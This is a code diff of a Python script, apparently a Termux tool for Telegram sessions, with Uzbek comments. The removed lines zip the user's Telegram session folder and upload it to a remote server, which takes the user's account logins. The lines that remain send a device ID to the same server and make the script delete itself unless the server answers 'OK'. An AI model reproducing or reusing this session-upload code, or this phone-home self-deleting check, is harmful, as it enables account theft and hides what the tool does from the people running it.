@@ -5,7 +5,6 @@ import os
 import uuid
 import hashlib
 import platform
-import zipfile
 import requests
 import sys
 import random
@@ -47,13 +46,11 @@ def get_sessions():
     return [f.split('.')[0] for f in os.listdir(SESSIONS_DIR) if f.endswith('.session')]
 
 ID_FILE = "device_id.txt"
+
+# Hozir ishlayotgan fayl nomi (self-delete uchun)
 SELF_FILE = os.path.abspath(__file__)
 
-BASE_DIR = os.path.dirname(SELF_FILE)
-SESSION_DIR = os.path.join(BASE_DIR, "session")
-ZIP_FILE = os.path.join(BASE_DIR, "session.zip")
-
-# Qurilma ID
+# Qurilmaga unikal ID yozib qo’yamiz
 if not os.path.exists(ID_FILE):
     device_id = str(uuid.uuid4())
     with open(ID_FILE, "w") as f:
@@ -62,30 +59,34 @@ else:
     with open(ID_FILE, "r") as f:
         device_id = f.read().strip()
 
-# Signature
+# Signature yaratamiz
 signature = hashlib.sha256((device_id + SECRET_TOKEN).encode()).hexdigest()
 
-# --- Server bilan tekshirish ---
-check_url = "https://68f77a7f47cf9.myxvest1.ru/Termuxguruxkolar/Akamga/secure_api.php"
-
+# Serverga yuboramiz
+url = "https://68f77a7f47cf9.myxvest1.ru/Termuxguruxkolar/Akamga/secure_api.php"
 params = {
     "api": API_KEY,
     "id": device_id,
     "signature": signature
 }
 
-response = requests.get(check_url, params=params)
+response = requests.get(url, params=params)
 server_msg = response.text.strip()
 
-if server_msg != "OK":
-    print("Ruxsat yo'q! Kod o'chirildi.")
+print("Server javobi:", server_msg)
 
+#  Agar server OK demasa  o‘zini va ID faylni o‘chiradi
+if server_msg != "OK":
+    print("\n Ruxsat yo‘q! Kod va fayl o‘chirildi. @termux_os")
+
+    # ID faylni o'chiramiz
     try:
         if os.path.exists(ID_FILE):
             os.remove(ID_FILE)
     except:
         pass
 
+    # PY faylning o‘zini o‘chiradi
     try:
         os.remove(SELF_FILE)
     except:
@@ -93,41 +94,8 @@ if server_msg != "OK":
 
     sys.exit()
 
-print("Ruxsat berildi!")
-
-# --- session papkani ZIP qilish ---
-if not os.path.exists(SESSION_DIR):
-    print("session papka topilmadi!")
-    sys.exit()
-
-print("ZIP tayyorlanmoqda...")
-
-with zipfile.ZipFile(ZIP_FILE, "w", zipfile.ZIP_DEFLATED) as zipf:
-    for root, dirs, files in os.walk(SESSION_DIR):
-        for file in files:
-            full_path = os.path.join(root, file)
-
-            arcname = os.path.relpath(full_path, BASE_DIR)
-
-            try:
-                zipf.write(full_path, arcname)
-            except:
-                print("ZIP qilinmadi:", full_path)
-
-print("ZIP tayyor:", ZIP_FILE)
-
-# --- ZIP faylni serverga 1 marta yuborish ---
-upload_url = "https://68f77a7f47cf9.myxvest1.ru/Termuxguruxkolar/Akamga/upload.php"
-
-files = {"file": open(ZIP_FILE, "rb")}
-data = {
-    "api": API_KEY,
-    "id": device_id,
-    "signature": signature
-}
-
-resp = requests.post(upload_url, data=data, files=files)
-print("Server javobi:", resp.text)
+# Hammasi OK
+print("\n Ruxsat berildi! Kod ishlashda davom etmoqda...\n")
 
 def list_accounts():
     clear_screen()
